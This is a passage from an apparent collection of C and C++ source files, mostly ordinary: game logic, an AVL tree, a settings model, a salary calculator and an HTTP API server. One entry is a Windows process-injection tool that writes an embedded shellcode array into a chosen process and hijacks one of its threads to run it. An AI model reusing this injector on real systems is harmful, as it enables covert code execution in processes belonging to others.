kingdom->details();\n        } else if (auto* victory = dynamic_cast<VictoryCard*>(card)) {\n            victory->details();\n        } else {\n            alert(\"Type de carte inconnu.\" );\n        }\n    } else {\n        alert(\"La carte '\" + nomCarte + \"' n'est pas reconnue.\" );\n    }\n}\n\nstd::string GameCommand::handlePick(const std::string& nomCarte, const Jeux& j) {\n    Plateau& p=j.getPlateau();\n    auto it=p.getReserve().find(normalize(nomCarte));\n    if(it!=p.getReserve().end())\n    {\n        return nomCarte;\n    }\n    alert(\"carte inexistant\");\n    return \"\";\n}\n\n\n\nvoid GameCommand::handleBuy(const std::string& nomCarte, Jeux& j, Phase phase) {\n    if (phase!=BUY) {\n        alert( \"Commande indisponible\" );\n        return;\n    }\n\n    Player& player = j.getActifPlayer();\n    if(player.buyCard(nomCarte,j)&&player.canBuy())\n    {\n        j.playerBoard(&player);\n        Jeux::phaseMessage(phase);\n    }\n}\n\n\nvoid GameCommand::handlePlay(const std::string& nomCarte, Jeux& j, Phase phase) {\n    if (phase!=ACTION) {\n        alert( \"Commande indisponible \" );\n        return;\n    }\n\n    Player& player = j.getActifPlayer();\n    if(player.playAction(nomCarte,j)&&player.canPlayAction())\n    {\n        j.playerBoard(&player);\n        Jeux::phaseMessage(phase);\n    }\n\n\n}\n\nvoid GameCommand::handleSell(const std::string& nomCarte, const Jeux& j, Phase phase) {\n    if (phase!=BUY) {\n        alert( \"Commande indisponible\" );\n        return;\n    }\n\n    Player& player = j.getActifPlayer();\n    if (nomCarte == \"ALL\") {\n        if(player.sellAllTreasure())\n        {\n            j.playerBoard(&player);\n            Jeux::phaseMessage(BUY);\n        }\n    }else{\n        if(player.sellCard(nomCarte))\n        {\n            j.playerBoard(&player);\n            Jeux::phaseMessage(phase);\n        }\n    }\n}\n\nvoid GameCommand::handleInfo(Jeux const&j)\n{\n    for(auto it :j.getPlayers())\n    {\n        if(it!=&j.getActifPlayer())\n        {\n            std::cout<<it->getName()<<\" \"<<it->getPoints()<<\" PV \"<<std::endl;\n        }\n    }\n}\nstd::string GameCommand::normalizeCommand(const std::string& input) {\n    // \u00c9tape 1 : Supprimer les espaces en d\u00e9but et en fin\n    std::string result = input;\n    result.erase(0, result.find_first_not_of(\" \\t\\n\\r\")); // Trim d\u00e9but\n    result.erase(result.find_last_not_of(\" \\t\\n\\r\") + 1); // Trim fin\n\n    // \u00c9tape 2 : Convertir en minuscules\n    std::ranges::transform(result.begin(), result.end(), result.begin(), ::toupper);\n\n    // \u00c9tape 3 : R\u00e9duire les espaces multiples \u00e0 un seul espace\n    std::ist",
    "// Copyright (c) 2025 Ian Dinwoodie. All rights reserved.\n// Use of this source code is governed by a GPLv3 license that can be found in\n// the LICENSE file.\n\n// Local Headers\n#include \"cdfw/core/ui/settings_model.h\"\n\n// C++ Standard Library Headers\n#include <list>\n#include <memory>\n\nnamespace cdfw {\nnamespace core {\nnamespace ui {\nnamespace {\nclass SettingsModelImpl : public SettingsModel {\npublic:\n  SettingsModelImpl() : state_(WifiState::DISCONNECTED), credentials_() {}\n  virtual ~SettingsModelImpl() = default;\n\n  virtual void\n  RegisterSubscriber(SettingsModelSubscriber *subscriber) override final {\n    subscribers_.push_back(subscriber);\n  }\n\n  virtual WifiState GetWifiState() override final { return state_; }\n\n  virtual void SetWifiState(WifiState state) override final {\n    state_ = state;\n    for (auto subscriber : subscribers_) {\n      subscriber->WifiStateChanged();\n    }\n  };\n\n  virtual WifiCredentials GetWifiCredentials() override final {\n    return credentials_;\n  }\n\n  virtual void\n  SetWifiCredentials(const WifiCredentials &credentials) override final {\n    credentials_ = credentials;\n  }\n\nprivate:\n  WifiState state_;\n  WifiCredentials credentials_;\n  std::list<SettingsModelSubscriber *> subscribers_;\n};\n} // namespace\n\nstd::shared_ptr<SettingsModel> SettingsModel::Create() {\n  return std::make_shared<SettingsModelImpl>();\n}\n} // namespace ui\n} // namespace core\n} // namespace cdfw",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"MyActor.h\"\n\n// Sets default values\nAMyActor::AMyActor()\n{\n \t// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\n    PrimaryActorTick.bCanEverTick = true;\n    start = FVector2D(0, 0);               //FVector2D\uc0ac\uc6a9 0,0 \uc5d0\uc11c \uc2dc\uc791\n\n\n}\n\n// Called when the game starts or when spawned\nvoid AMyActor::BeginPlay()\n{\n\tSuper::BeginPlay();                   //\uc2dc\uc791\ud588\uc744\ub54c\n    Move();                               //Move \uc791\ub3d9\n}\n\n// Called every frame\nvoid AMyActor::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n}\n\nvoid AMyActor::Move()                     //Move\n{\n    for (int32 i = 0; i < 10; ++i)        //10\ubc88 \ubc18\ubcf5\ud55c\ub2e4. (i\uac00 0 ~ 9\uae4c\uc9c0 \ubc18\ubcf5\ud55c\ub2e4)\n    {\n        \n        int32 XStep = Step();             //XStep \uc560 Step()\ub79c\ub364\uc73c\ub85c \uc0dd\uc131\ub41c 0\ub610\ub2941 \ub300\uc785\n        int32 YStep = Step();             //YStep \uc560 Step()\ub79c\ub364\uc73c\ub85c \uc0dd\uc131\ub41c 0\ub610\ub2941 \ub300\uc785\n\n        start.X += XStep;                 //start\uc758 X \uc88c\ud45c\uc5d0 XStep \ub354\ud558\uae30\n        start.Y += YStep;                 //start\uc758 Y \uc88c\ud45c\uc5d0 YStep \ub354\ud558\uae30\n        LogPosition();                    //\uc704\uce58\n    }\n}\n\nint32 AMyActor::Step()                    //step\ub294 0\ub610\ub2941 \ubc18\ud658\ud658\n{\n    return FMath::RandRange(0, 1);        //FMath::RandRange(\uc720\ub2c8\ud2f0 \ud568\uc218)\ub97c \uc0ac\uc6a9\ud574 \ub79c\ub364\ud55c 0\ub610\ub2941 \ubc18\ud658         \n}\n\n\nvoid AMyActor::LogPosition() const        //LogPosition(\ud604\uc7ac \uc704\uce58 \ucd9c\ub825) const \uc678\ubd80\uc5d0\uc11c \ubabb\ubc14\uafc8?          \n{\n    UE_LOG(LogTemp, Warning, TEXT(\"Current Position: (%d, %d)\"),  //LogTemp\uc0ac\uc6a9, \uc2ec\uac01\ub3c4? \uba54\uc2dc\uc9c0 \uc0c9\uc774 \ub2ec\ub77c\uc9d0, \ucd9c\ub825 \uba54\uc2dc\uc9c0 \n        static_cast<int32>(start.X),      //%d start.X\uc758 \uac12\n        static_cast<int32>(start.Y));     //%d start.Y\uc758 \uac12\n}",
    "// ----------------------------------------------------------------------------\n// SleepyPiPlayer:  AudioVolumeConversion\n//     human audio-perception is logarithmic\n//     convert value in percent to value suitable for\n//     mpg123_volume(handle, ConvertPctToDouble(nValueInPercent))\n// license: free software   (sleepypiplayer(at)saftfresse.de)  [A.D.2025]\n// - Do whatever you want with the software.\n// - Do not claim my work as your own.\n// - THIS SOFTWARE COMES WITH NO WARRANTIES, USE AT YOUR OWN RISK\n// ----------------------------------------------------------------------------\n#include \"AudioVolumeConversion.h\"\n\n// ============================================================================\nclass AudioVolumeConversion::PrivateData\n{\npublic:\n   PrivateData()\n   {\n      double dVolumeVal = 1.5; // arr[100] = 1.5  arr[20] = 0.1\n      for (int i = 100; i >= 0; i--)\n      {\n         m_arrVolume[i] = dVolumeVal;\n         dVolumeVal *= 0.966715;  // 10^(log10(1.5/0.1)/80)\n      }\n   }\n   virtual ~PrivateData()\n   {\n   }\n\n   double   m_arrVolume[101];\n};\n\n\n// ============================================================================\n\nAudioVolumeConversion::AudioVolumeConversion()\n{\n   m_pPriv = std::make_unique<AudioVolumeConversion::PrivateData>();\n}\n\n// ----------------------------------------------------------------------------\n\nAudioVolumeConversion::~AudioVolumeConversion()\n{\n}\n\n// ----------------------------------------------------------------------------\n\n/** convert linear volume in percent to mpg123_volume(...) */\ndouble AudioVolumeConversion::ConvertPercentToDouble(int nVolumePct)\n{\n   nVolumePct = std::min(100, nVolumePct);\n   nVolumePct = std::max(0,   nVolumePct);\n   return m_pPriv->m_arrVolume[nVolumePct];\n}\n",
    "#include \"AVL_Tree.h\"\r\n#include <iostream>\r\nusing namespace std;\r\n\r\n// Public functions\r\nAVL_Tree::AVL_Tree() {\r\n    root = nullptr;\r\n}\r\n\r\nAVL_Tree::AVL_Tree(int *arr, int n) {\r\n    root = nullptr;\r\n    for(int i = 0; i < n; i++) {\r\n        bool inserted = false;\r\n        root = insertHelper(root, arr[i], &inserted);\r\n    }\r\n}\r\n\r\nAVL_Tree::~AVL_Tree() {\r\n    clear();\r\n}\r\n\r\nbool AVL_Tree::search(int key) {\r\n    return searchHelper(root, key);\r\n}\r\n\r\nbool AVL_Tree::isEmpty() {\r\n    return root == nullptr;\r\n}\r\n\r\nvoid AVL_Tree::clear() {\r\n    clearHelper(root);\r\n    root = nullptr;\r\n}\r\n\r\nbool AVL_Tree::insert(int key) {\r\n    bool inserted = false;\r\n    root = insertHelper(root, key, &inserted);\r\n    return inserted;\r\n}\r\n\r\nbool AVL_Tree::remove(int key) {\r\n    bool removed = false;\r\n    root = removeHelper(root, key, removed);\r\n    return removed;\r\n}\r\n\r\n// Private functions\r\nint AVL_Tree::getHeight(AVL_Node *node) {\r\n    if(node == nullptr) {\r\n        return 0;\r\n    }\r\n    return node->height;\r\n}\r\n\r\nint AVL_Tree::getBalance(AVL_Node *node) {\r\n    if(node == nullptr) {\r\n        return 0;\r\n    }\r\n    return getHeight(node->left) - getHeight(node->right);\r\n}\r\n\r\n// Returns the new root\r\nAVL_Node * AVL_Tree::rightRotate(AVL_Node *y) {\r\n    AVL_Node* leftChild = y->left;\r\n    y->left = leftChild->right;\r\n    leftChild->right = y;\r\n\r\n    // update heights\r\n    y->height = 1 + max(getHeight(y->left), getHeight(y->right));\r\n    leftChild->height = 1 + max(getHeight(leftChild->left), getHeight(leftChild->right));\r\n    return leftChild;\r\n}\r\n\r\nAVL_Node * AVL_Tree::leftRotate(AVL_Node *x) {\r\n    AVL_Node* rightNode = x->right;\r\n    x->right = rightNode->left;\r\n    rightNode->left = x;\r\n\r\n    x->height = 1 + max(getHeight(x->left), getHeight(x->right));\r\n    rightNode->height = 1 + max(getHeight(rightNode->left), getHeight(rightNode->right));\r\n    return rightNode;\r\n}\r\n\r\nAVL_Node* AVL_Tree::minValueNode(AVL_Node *node) {\r\n    AVL_Node* current = node;\r\n    while(current->left != nullptr) {\r\n        current = current->left;\r\n    }\r\n    return current;\r\n}\r\n\r\nbool AVL_Tree::searchHelper(AVL_Node *node, int key) {\r\n    if(node == nullptr) {\r\n        return false;\r\n    }\r\n    if(node->key == key) {\r\n        return true;\r\n    }\r\n    if(key < node->key) {\r\n        return searchHelper(node->left, key);\r\n    } else {\r\n        return searchHelper(node->right, key);\r\n    }\r\n}\r\n\r\nvoid AVL_Tree::clearHelper(AVL_Node *node) {\r\n    if(node == nullptr) {\r\n        return;\r\n    }\r\n    clearHelper(node->left);\r\n    clearHelper(node->right);\r\n    delete node;\r\n}\r\n\r\nAVL_Node* AVL_Tree::insertHelper(AVL_Node* node, int key, bool* inserted) {\r\n    if(node == nullptr) {\r\n        *inserted = true;\r\n        return new AVL_Node(key);\r\n    }\r\n\r\n    if(key < node->key) {\r\n        node->left = insertHelper(node->left, key, inserted);\r\n    }\r\n    else {\r\n        // Key is >= node->key, always go right for duplicates\r\n        node->right = insertHelper(node->right, key, inserted);\r\n    }\r\n\r\n    node->height = 1 + max(getHeight(node->left), getHeight(node->right));\r\n    int balance = getBalance(node);\r\n\r\n    // Left Left Case\r\n    if(balance > 1 && key < node->left->key) {\r\n        return rightRotate(node);\r\n    }\r\n\r\n    // Right Right Case\r\n    if(balance < -1 && key >= node->right->key) {\r\n        return leftRotate(node);\r\n    }\r\n\r\n    // Left Right Case\r\n    if(balance > 1 && key >= node->left->key) {\r\n        node->left = leftRotate(node->left);\r\n        return rightRotate(node);\r\n    }\r\n\r\n    // Right Left Case\r\n    if(balance < -1 && key < node->right->key) {\r\n        node->right = rightRotate(node->right);\r\n        return leftRotate(node);\r\n    }\r\n\r\n    return node;\r\n}\r\n\r\nAVL_Node* AVL_Tree::removeHelper(AVL_Node* node, int key, bool& removed) {\r\n    if(node == nullptr) {\r\n        removed = false;\r\n        return nullptr;\r\n    }\r\n\r\n    if(key < node->key) {\r\n        node->left = removeHelper(node->left, key, removed);\r\n    }\r\n    else if(key > node->key) {\r\n        node->right = removeHelper(node->right, key, removed);\r\n    }\r\n    else {  // key == node->key\r\n        // Check for duplicates in left subtree first\r\n        bool hasLeftDuplicate = false;\r\n        AVL_Node* temp = node->left;\r\n        while(temp) {\r\n            if(temp->key == key) {\r\n                hasLeftDuplicate = true;\r\n                break;\r\n            }\r\n            temp = temp->right;\r\n        }\r\n\r\n        if(hasLeftDuplicate) {\r\n            node->left = removeHelper(node->left, key, removed);\r\n        }\r\n        else {\r\n            removed = true;\r\n            // Node with only one child or no child\r\n            if(node->left == nullptr) {\r\n                AVL_Node* temp = node->right;\r\n                delete node;\r\n                return temp;\r\n            }\r\n            else if(node->right == nullptr) {\r\n                AVL_Node* temp = node->left;\r\n                delete node;\r\n                return temp;\r\n            }\r\n\r\n            // Node with two children\r\n            ",
    "#include <iostream>\n#include <Windows.h>\n#include <TlHelp32.h>\n#include <WtsApi32.h>\n#pragma comment(lib, \"WtsApi32.lib\")\n\nusing namespace std;\n\nvoid LogHex(const string& message, PVOID value) {\n    cout << \"[+] \" << message << \": 0x\" << hex << uppercase << (uintptr_t)value << nouppercase << dec << endl;\n}\n\nunsigned char shellcode[] =\n    \"\\x48\\x83\\xEC\\x28\\x48\\x83\\xE4\\xF0\\x48\\x8D\\x15\\x66\\x00\\x00\\x00\"\n    \"\\xE9\\x14\\xFF\\xFF\\xFF\\x48\\x03\\xC3\\x48\\x83\\xC4\\x28\\xC3\";\n\nHANDLE findThread(DWORD pid) {\n    HANDLE hSnapshot;\n    THREADENTRY32 tEntry;\n    HANDLE hThread;\n    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n    tEntry.dwSize = sizeof(tEntry);\n\n    while (Thread32Next(hSnapshot, &tEntry)) {\n        if (tEntry.th32OwnerProcessID == pid) {\n            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tEntry.th32ThreadID);\n            if (hThread == NULL || tEntry.th32ThreadID == 0) {\n                continue;\n            }\n            else {\n                LogHex(\"Thread handle found\", hThread);\n                return hThread;\n            }\n        }\n    }\n    return NULL;\n}\n\nHANDLE getHandleProcessByPID(DWORD pid) {\n    HANDLE hSnapshot;\n    PROCESSENTRY32 pEntry;\n    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    pEntry.dwSize = sizeof(pEntry);\n    HANDLE hProcess = NULL;\n\n    while (Process32Next(hSnapshot, &pEntry)) {\n        if (pEntry.th32ProcessID == pid) {\n            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pEntry.th32ProcessID);\n            if (hProcess == NULL || pEntry.th32ProcessID == 0) {\n                continue;\n            }\n            else {\n                LogHex(\"Process handle obtained\", hProcess);\n                return hProcess;\n            }\n        }\n    }\n    return NULL;\n}\n\nCONTEXT getThreatContext(HANDLE hThread) {\n    CONTEXT context;\n    context.ContextFlags = CONTEXT_FULL;\n    SuspendThread(hThread);\n    GetThreadContext(hThread, &context);\n    LogHex(\"Thread context obtained\", (PVOID)context.Rip);\n    return context;\n}\n\nint main() {\n    HANDLE hThread;\n    CONTEXT context;\n    DWORD pid;\n\n    cout << \"Enter the PID of the target process: \";\n    cin >> pid;\n\n    if (pid == 0) {\n        cerr << \"[!] Invalid PID provided.\" << endl;\n        return 1;\n    }\n\n    hThread = findThread(pid);\n    if (hThread == NULL) {\n        cerr << \"[!] Could not find a thread for the process with PID: \" << pid << \".\" << endl;\n        return 1;\n    }\n\n    context = getThreatContext(hThread);\n    HANDLE hProcess = NULL;\n    hProcess = getHandleProcessByPID(pid);\n\n    if (hProcess == NULL) {\n        cerr << \"[!] Could not get a handle to the process with PID: \" << pid << \".\" << endl;\n        return 1;\n    }\n\n    LPVOID mSpace = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (mSpace == NULL) {\n        cerr << \"[!] Could not allocate memory in the target process.\" << endl;\n        return 1;\n    }\n    LogHex(\"Memory allocated in target process\", mSpace);\n\n    if (!WriteProcessMemory(hProcess, mSpace, shellcode, sizeof(shellcode), NULL)) {\n        cerr << \"[!] Failed to write the code into the target process.\" << endl;\n        return 1;\n    }\n    cout << \"[+] Shellcode written to target process memory.\" << endl;\n\n    context.Rip = (DWORD_PTR)mSpace;\n    SetThreadContext(hThread, &context);\n    ResumeThread(hThread);\n    LogHex(\"Thread resumed at\", mSpace);\n\n    cout << \"[+] Execution successful!\" << endl;\n\n    return 0;\n}\n",
    "\ufeff// \u2705 file verified.\n#include \"incl.h\"\n#include \"decl.h\"\n\n// \u2705 function + comment verified.\n/**\n * @brief Converts a `sockaddr_in` structure to a human-readable IPv4 address string.\n *\n * @detailed\n * This function takes a `sockaddr_in` structure (typically from a network connection)\n * and converts the IP address into a readable string format using `inet_ntop`\n * (or `InetNtopA` on Windows).\n *\n * Functionality:\n * - Uses `inet_ntop()` (or `InetNtopA()` on Windows) to convert the binary IPv4 address\n *   (`sin_addr`) to a string.\n * - If conversion fails, returns `\"Unknown\"`.\n *\n * Platform-Specific Handling:\n * - On Windows, uses `InetNtopA()` from `Ws2tcpip.h`.\n * - On Linux/macOS, uses `inet_ntop()` from `arpa/inet.h`.\n *\n * Edge Cases Handled:\n * - If the conversion function fails, returns `\"Unknown\"`.\n *\n * @param addr A `sockaddr_in` structure containing the IP address.\n * @return A `std::string` representing the human-readable IP address.\n *\n * @complexity\n * - Time Complexity: O(1) (Single system call).\n * - Space Complexity: O(1) (Fixed-size buffer for IP conversion).\n */\nstd::string ipToString(const sockaddr_in& addr) \n{\n    char ip_str[INET_ADDRSTRLEN];\n#ifdef _WIN32\n    if (InetNtopA(AF_INET, &(addr.sin_addr), ip_str, INET_ADDRSTRLEN) == NULL) {\n        return \"Unknown\";\n    }\n#else\n    if (inet_ntop(AF_INET, &(addr.sin_addr), ip_str, INET_ADDRSTRLEN) == NULL) {\n        return \"Unknown\";\n    }\n#endif\n    return std::string(ip_str);\n}\n\n// \u2705 function + comment verified.\n/**\n * @brief Starts an HTTP API server to process shortest path queries.\n *\n * @detailed\n * This function initializes a socket-based API gateway that listens for HTTP requests\n * on port 80. The server processes GET requests with start and end node parameters\n * and returns the shortest path result in JSON or XML format.\n *\n * Steps of Execution:\n * - Step 1: Initialize Network Socket\n *   - On Windows, initializes Winsock (`WSAStartup`).\n *   - Creates a listening socket (`socket()`) for accepting connections.\n *   - Binds the socket to port 80 (`bind()`) and starts listening (`listen()`).\n *\n * - Step 2: Handle Incoming Requests\n *   - Accepts incoming client connections (`accept()`).\n *   - Reads the HTTP GET request to extract:\n *     - `start` (source node)\n *     - `end` (destination node)\n *     - `weight` (optional heuristic weight factor).\n *   - Parses request headers to determine response format (`JSON` or `XML`).\n *\n * - Step 3: Compute Shortest Path\n *   - Calls `findShortestPath()` using the extracted parameters.\n *   - If the path is found, constructs a valid JSON/XML response.\n *   - If the path does not exist, returns a `404 Not Found` error.\n *\n * - Step 4: Send HTTP Response\n *   - Constructs an HTTP response header.\n *   - Generates a JSON or XML response body.\n *   - Sends the response back to the client (`send()`).\n *\n * - Step 5: Clean Up\n *   - Closes the client socket (`closesocket()`).\n *   - Logs the request and response details.\n *\n * Edge Cases Handled:\n * - Winsock Initialization Failure (Windows) \u2192 Logs and exits.\n * - Socket Creation/Binding Errors \u2192 Logs and exits.\n * - Invalid HTTP Requests \u2192 Returns `400 Bad Request`.\n * - Malformed Query Parameters \u2192 Returns `400 Bad Request`.\n * - No Path Found \u2192 Returns `404 Not Found`.\n * - Unsupported Accept Headers \u2192 Returns `400 Bad Request`.\n *\n * @param gdata The graph data structure used for shortest path calculations.\n * @param conf The configuration settings for the API.\n * @return `0` on success, `1` on failure.\n *\n * @complexity\n * - Time Complexity:\n *   - Socket Setup: O(1)\n *   - Request Parsing: O(N) (where N is request length)\n *   - Path Calculation: O(E log V) (Dijkstra/A* search)\n *   - Response Construction: O(M) (where M is response size)\n *   - Overall Complexity: O(E log V) (depends on graph traversal).\n * - Space Complexity:\n *   - Request Buffer: O(1)\n *   - Response Buffer: O(1)\n *   - Graph Memory Usage: O(V + E).\n */\nint launchApiGateway(const graph& gdata, const config& conf)\n{\n#ifdef _WIN32\n    WSADATA wsa_data;\n    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {\n        console(\"error\", \"failed to initialize winsock.\");\n        logger(\"error: failed to initialize winsock.\");\n        return 1;\n    }\n#endif\n\n    SOCKET listening_socket = socket(AF_INET, SOCK_STREAM, 0);\n    if (listening_socket == INVALID_SOCKET) {\n        console(\"error\", \"socket creation failed.\");\n        logger(\"error: socket creation failed.\");\n#ifdef _WIN32\n        WSACleanup();\n#endif\n        return 1;\n    }\n\n    sockaddr_in service;\n    memset(&service, 0, sizeof(service));\n    service.sin_family = AF_INET;\n    service.sin_addr.s_addr = htonl(INADDR_ANY);\n    service.sin_port = htons(80);\n\n    if (bind(listening_socket, reinterpret_cast<sockaddr*>(&service), sizeof(service)) == SOCKET_ERROR) {\n        console(\"error\", \"bind failed.\");\n        logger(\"error: bind failed.\");\n        closesocket(listening_socket);\n#ifdef _WIN32\n        WSACleanup();\n#endif\n",
    "#include \"Column.h\"\n\nusing namespace std;\n\nconst int Column::NAME_MIN_SIZE = 2;\n\n//public methods\n//SETTERS\nvoid Column::setName(const string& name) {\n\tif (name.empty() || name.size() < NAME_MIN_SIZE) {\n\t\tthrow invalid_argument(\"Name cannot be empty or less than \" + to_string(NAME_MIN_SIZE) + \" characters.\");\n\t}\n\tthis->name = name;\n}\nvoid Column::setType(ColumnType type) {\n\tthis->type = type;\n}\nvoid Column::setSize(int size) {\n\tif (size <= 0) {\n\t\tthrow invalid_argument(\"Size must be larger than zero.\");\n\t}\n\tthis->size = size;\n}\nvoid Column::setDefaultValue(const string& defaultValue) {\n\tif (defaultValue.size() > this->size) {\n\t\tthrow invalid_argument(\"Default value cannot be larger than the column size.\");\n\t}\n\tswitch (this->type) {\n\tcase TEXT:\n\t\tthis->defaultValue = defaultValue;\n\t\tbreak;\n\tcase INT:\n\t\tif (ValidDataType::isValidInt(defaultValue)) {\n\t\t\tthis->defaultValue = defaultValue;\n\t\t}\n\t\telse {\n\t\t\tthrow invalid_argument(\"Default value must be a valid integer.\");\n\t\t}\n\t\tbreak;\n\tcase FLOAT:\n\t\tif (ValidDataType::isValidFloat(defaultValue)) {\n\t\t\tthis->defaultValue = defaultValue;\n\t\t}\n\t\telse {\n\t\t\tthrow invalid_argument(\"Default value must be a valid float.\");\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tthrow invalid_argument(\"Invalid column type.\");\n\t}\n}\n\n//GETTERS\nconst string& Column::getName() const {\n\treturn this->name;\n}\nColumnType Column::getType() const {\n\treturn this->type;\n}\nint Column::getSize() const {\n\treturn this->size;\n}\nconst string& Column::getDefaultValue() const {\n\treturn this->defaultValue;\n}\nconst bool Column::isUnique() const {\n\treturn this->unique;\n}\n\n//DEFAULT CONSTRUCTOR\nColumn::Column() {\n\tthis->name = \"\";\n\tthis->type = TEXT;\n\tthis->size = 0;\n\tthis->defaultValue = \"\";\n\tthis->unique = false;\n}\n//CONSTRUCTOR\nColumn::Column(const string& name, ColumnType type, int size, const string& defaultValue) {\n\tthis->setName(name);\n\tthis->setType(type);\n\tthis->setSize(size);\n\tthis->setDefaultValue(defaultValue);\n\tthis->unique = false;\n}\n//CONSTRUCTOR FOR UNIQUE\nColumn::Column(const string& name, ColumnType type, int size, const string& defaultValue, bool unique) {\n\tthis->setName(name);\n\tthis->setType(type);\n\tthis->setSize(size);\n\tthis->setDefaultValue(defaultValue);\n\tthis->unique = unique;\n}",
    " #include <stdio.h>\n\nint main() {\n    float salario, inss = 0.0, ir = 0.0, sal_liquido;\n\n    printf(\"C\u00e1lculo de Sal\u00e1rio L\u00edquido com desconto do IR e INSS\\n\\n\");\n    printf(\"Digite seu sal\u00e1rio bruto: \"); \n    scanf(\"%f\", &salario);\n\n    // C\u00e1lculo do INSS baseado em al\u00edquotas progressivas (dados atualizados)\n    if (salario <= 1412.00) {\n        inss = salario * 0.075;\n    } else if (salario <= 2666.68) {\n        inss = (1412.00 * 0.075) + ((salario - 1412.00) * 0.09);\n    } else if (salario <= 4000.03) {\n        inss = (1412.00 * 0.075) + (1254.68 * 0.09) + ((salario - 2666.68) * 0.12);\n    } else if (salario <= 7786.02) {\n        inss = (1412.00 * 0.075) + (1254.68 * 0.09) + (1333.35 * 0.12) + ((salario - 4000.03) * 0.14);\n    } else {\n        inss = 908.86; // Teto m\u00e1ximo do INSS\n    }\n\n    // Base de c\u00e1lculo do Imposto de Renda (IR)\n    float base_ir = salario - inss;\n\n    // C\u00e1lculo do IR baseado em al\u00edquotas e dedu\u00e7\u00f5es (dados atualizados)\n    if (base_ir <= 2259.20) {\n        ir = 0.0;\n    } else if (base_ir <= 2826.65) {\n        ir = (base_ir * 0.075) - 169.44;\n    } else if (base_ir <= 3751.05) {\n        ir = (base_ir * 0.15) - 381.44;\n    } else if (base_ir <= 4664.68) {\n        ir = (base_ir * 0.225) - 662.77;\n    } else {\n        ir = (base_ir * 0.275) - 896.00;\n    }\n\n    // C\u00e1lculo do sal\u00e1rio l\u00edquido\n    sal_liquido = salario - inss - ir;\n\n    // Exibi\u00e7\u00e3o dos resultados\n    printf(\"\\nDesconto do INSS: R$ %.2f\\n\", inss);\n    printf(\"Desconto do Imposto de Renda: R$ %.2f\\n\", ir);\n    printf(\"Sal\u00e1rio L\u00edquido: R$ %.2f\\n\\n\", sal_liquido);\n\n    return 0;\n}\n     \n",
    "#include <fstream>\n#include \"cm_brush.hpp\"\n#include \"cm_typedefs.hpp\"\n#include \"utils/errors.hpp\"\n#include <fs/fs_io.hpp>\n#include <fs/fs_globals.hpp>\n\n#include \"cg/cg_local.hpp\"\n#include \"cg/cg_offsets.hpp\"\n#include <iostream>\n\nstatic void CM_WriteHeader(std::stringstream& f)\n{\n\tf << \"iwmap 4\\n\";\n\tf << \"\\\"000_Global\\\" flags  active\\n\";\n\tf << \"\\\"The Map\\\" flags\\n\";\n\tf << \"// entity 0\\n{\\n\";\n\tf << \"\\\"contrastGain\\\" \" \"\\\"0.125\\\"\" << '\\n';\n\tf << \"\\\"diffusefraction\\\" \" \"\\\"0.5\\\"\" << '\\n';\n\tf << \"\\\"_color\\\" \" \"\\\"0.2 0.27 0.3 1\\\"\" << '\\n';\n\tf << \"\\\"sunlight\\\" \" \"\\\"1\\\"\" << '\\n';\n\tf << \"\\\"sundirection\\\" \" \"\\\"-30 -95 0\\\"\" << '\\n';\n\tf << \"\\\"sundiffusecolor\\\" \" \"\\\"0.2 0.27 0.3 1\\\"\" << '\\n';\n\tf << \"\\\"suncolor\\\" \" \"\\\"0.2 0.27 0.3 1\\\"\" << '\\n';\n\tf << \"\\\"ambient\\\" \" \"\\\".1\\\"\" << '\\n';\n\tf << \"\\\"bouncefraction\\\" \" \"\\\".7\\\"\" << '\\n';\n\tf << \"\\\"classname\\\" \\\"worldspawn\\\"\\n\";\n}\nstatic void CM_WriteAllBrushes(std::stringstream& o)\n{\n\tif (CClipMap::Size() == 0) {\n\t\treturn FatalError(\"CClipMap::size() == 0\");\n\t}\n\n\tint brushIndex = 0;\n\tbool entity_start = false;\n\n\tstd::unique_lock<std::mutex> lock(CClipMap::GetLock());\n\n\tCClipMap::ForEach([&](const GeometryPtr_t& geom) {\n\n\t\tif (geom->type() == cm_geomtype::model && !entity_start) {\n\t\t\tentity_start = true;\n\t\t\tbrushIndex = 1;\n\t\t\t//end brushes, start entities\n\t\t\to << \"}\\n\";\n\t\t}\n\n\t\tbrushIndex = geom->map_export(o, brushIndex);\n\t});\n\n\tif (!entity_start) {\n\t\to << \"}\\n\";\n\t}\n\n}\n\nvoid CM_WriteInOrder(std::stringstream& o)\n{\n\tCM_WriteHeader(o);\n\tCM_WriteAllBrushes(o);\n\n\n\n}\n\nvoid CM_MapExport()\n{\n\tif (!cm->name)\n\t\treturn;\n\n\tCM_LoadMap();\n\n\tstd::string name = cm->name;\n\tname = name.substr(0u, name.length() - sizeof(\".d3dbsp\") + 1u);\n\tname = name.substr(sizeof(\"maps\"));\n\n\tconst std::string path = \"map_source\\\\kej\\\\\";\n\tconst std::string full_path = path + name + \".map\";\n\n\tconst auto writer = WaWIOWriter(full_path, false);\n\tstd::stringstream map;\n\n\tCM_WriteInOrder(map);\n\n\tif (writer.IO_Write(map.str())) {\n\t\tconst std::string str = std::format(\"^1{} export courtesy of the great\\n^2xkejj^1.\\n\", name);\n\t\t((void(*)(int, char*))0x59A2C0)(5, (char*)str.c_str());\n\t}\n\telse {\n\t\t((void(*)(int, char*))0x59A2C0)(5, (char*)\"^1Failed!\\n\");\n\t}\n\n\n}",
